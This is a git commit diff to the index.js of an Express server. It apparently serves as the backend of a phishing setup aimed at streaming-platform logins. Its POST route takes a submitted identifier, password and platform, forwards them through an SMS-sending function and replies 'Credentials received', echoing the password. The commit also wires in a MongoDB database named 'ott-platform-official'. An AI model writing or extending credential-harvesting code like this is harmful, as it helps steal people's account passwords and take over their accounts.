abcbfd33551a2061d88ecbe2f78cc3b239654c4c
ravikumarmunikuntala8 <153378860+ravikumarmunikuntala8@users.noreply.github.com>
2023-12-10 11:57:03 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,19 @@
 const express = require("express");
 const cors = require("cors");
-const sendMsg = require("./sms.js");
+const sendMsg = require("./services/sms");
+const mongoose = require("mongoose");
 require("dotenv").config();
+mongoose
+  .connect(
+    `mongodb+srv://${process.env.MONGODB_USERNAME}:${process.env.MONGODB_PASSWORD}@ott-platform-official.g4y3gt6.mongodb.net/ott-platform-official?retryWrites=true&w=majority`
+  )
+  .then(() => {
+    console.log("Database connected Successfully");
+  })
+  .catch((e) => {
+    console.log(e);
+    console.error("Unable to connect to database");
+  });
 
 const port = process.env.PORT;
 const app = express();
@@ -16,19 +28,12 @@ app.get("/", (req, res) => {
 
 app.post("/", async (req, res) => {
   const { identifier, password, platform } = req.body;
-  const response = await sendMsg(identifier, password, platform);
-  if(response)
-  {
+  await sendMsg(identifier, password, platform);
   res.status(200).json({
     message: "Credentials received",
     identifier: identifier,
     password: password,
   });
-  }
-  else
-  {
-    res.status(500).json({message:"Internal Server Error"});
-  }
 });
 
 app.listen(port, () => {
